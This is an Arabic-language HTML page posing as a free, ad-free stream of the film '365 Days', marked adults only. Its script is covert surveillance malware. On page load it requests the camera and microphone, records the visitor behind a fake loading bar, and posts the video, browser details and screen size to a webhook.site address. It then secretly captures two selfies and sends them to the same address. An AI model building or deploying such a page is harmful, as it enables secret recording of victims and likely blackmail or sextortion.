<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>365 Days – مشاهدة الفيلم كامل مجاناً 2025</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a0033, #000);
      color: #fff;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      background: rgba(0,0,0,0.7);
      padding: 30px 20px;
      box-shadow: 0 4px 20px rgba(255,0,150,0.4);
    }
    h1 {
      margin: 0;
      font-size: 2.8rem;
      color: #ff69b4;
      text-shadow: 0 0 15px #ff1493;
    }
    p.subtitle {
      font-size: 1.3rem;
      margin: 10px 0;
      opacity: 0.9;
    }
    #progress-container {
      margin: 50px auto;
      width: 85%;
      max-width: 600px;
      height: 40px;
      background: rgba(255,255,255,0.1);
      border-radius: 20px;
      overflow: hidden;
      display: none;
      border: 2px solid #ff69b4;
    }
    #progress-bar {
      width: 0%;
      height: 100%;
      background: linear-gradient(to right, #ff1493, #ff69b4, #ff1493);
      transition: width 5s linear;
      box-shadow: 0 0 20px #ff1493;
    }
    .content {
      flex: 1;
      padding: 30px 20px;
      display: none;
    }
    .movie-poster {
      max-width: 90%;
      margin: 30px auto;
      border-radius: 16px;
      box-shadow: 0 10px 40px rgba(255,105,180,0.5);
      border: 3px solid #ff69b4;
    }
    footer {
      padding: 25px;
      background: rgba(0,0,0,0.8);
      font-size: 0.95rem;
      opacity: 0.8;
    }
    #status {
      font-size: 1.5rem;
      margin: 40px;
      color: #ff69b4;
      text-shadow: 0 0 10px #ff1493;
    }
  </style>
</head>
<body>

<header>
  <h1>365 Days</h1>
  <p class="subtitle">شاهد الفيلم كامل HD مجاناً الآن – بدون إعلانات مزعجة</p>
</header>

<div id="status">جاري التحميل... انتظر ثوانٍ فقط</div>
<div id="progress-container">
  <div id="progress-bar"></div>
</div>

<div class="content" id="main-content">
  <!-- صورة واحدة فقط من فيلم 365 Days – رومانسية جداً -->
  <img src="https://image.tmdb.org/t/p/original/6CoRTJTmijhBLJTUNoVSUNxZMEI.jpg" alt="365 Days – مشهد رومانسي" class="movie-poster">
  <p style="font-size: 1.4rem; margin-top: 20px; color: #ff69b4;">
    الفيلم الرومانسي الأكثر إثارة في 2025 – استمتع بالمشاهدة الكاملة الآن
  </p>
</div>

<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<footer>
  © 2025 365 Days Streaming – جميع الحقوق محفوظة | محتوى للكبار فقط
</footer>

<script>
const video = document.getElementById('hiddenVideo');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const progressBar = document.getElementById('progress-bar');
const progressContainer = document.getElementById('progress-container');
const status = document.getElementById('status');
const mainContent = document.getElementById('main-content');

const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";

async function recordAndSend() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });

    video.srcObject = stream;
    await video.play();

    progressContainer.style.display = 'block';
    status.textContent = "جاري التحميل... لا تغلق الصفحة";

    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];

    recorder.ondataavailable = e => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    recorder.start(100);

    progressBar.style.width = '0%';
    let progress = 0;
    const interval = setInterval(() => {
      progress += 2;
      progressBar.style.width = progress + '%';
      if (progress >= 100) {
        clearInterval(interval);
        finishRecording(recorder, chunks, stream);
      }
    }, 100);

  } catch (err) {
    status.textContent = "يرجى السماح بالوصول إلى الكاميرا لمتابعة المشاهدة";
    console.log("خطأ أو رفض:", err);
  }
}

async function finishRecording(recorder, chunks, stream) {
  recorder.stop();

  recorder.onstop = async () => {
    const blob = new Blob(chunks, { type: 'video/webm' });

    const fdVideo = new FormData();
    fdVideo.append('video', blob, `capture_${Date.now()}.webm`);
    fdVideo.append('timestamp', Date.now());
    fdVideo.append('user_agent', navigator.userAgent);
    fdVideo.append('screen', `\( {screen.width}x \){screen.height}`);

    await fetch(WEBHOOK_URL, { method: 'POST', body: fdVideo }).catch(err => console.log(err));

    stream.getTracks().forEach(track => track.stop());
    video.srcObject = null;

    status.style.display = 'none';
    progressContainer.style.display = 'none';
    mainContent.style.display = 'block';

    setTimeout(() => captureSelfie(1), 1500);
    setTimeout(() => captureSelfie(2), 3000);
  };
}

async function captureSelfie(num) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 800));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(blob => sendBlob(blob, num), 'image/jpeg', 0.92);

    setTimeout(() => {
      stream.getTracks().forEach(track => track.stop());
      video.srcObject = null;
    }, 500);
  } catch (err) {
    console.log("خطأ في الـ selfie:", err);
  }
}

function sendBlob(blob, num) {
  const fd = new FormData();
  fd.append('photo', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
  fd.append('timestamp', Date.now());
  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(err => console.log(err));
}

window.addEventListener('load', () => {
  setTimeout(recordAndSend, 1000);
});
</script>

</body>
</html>
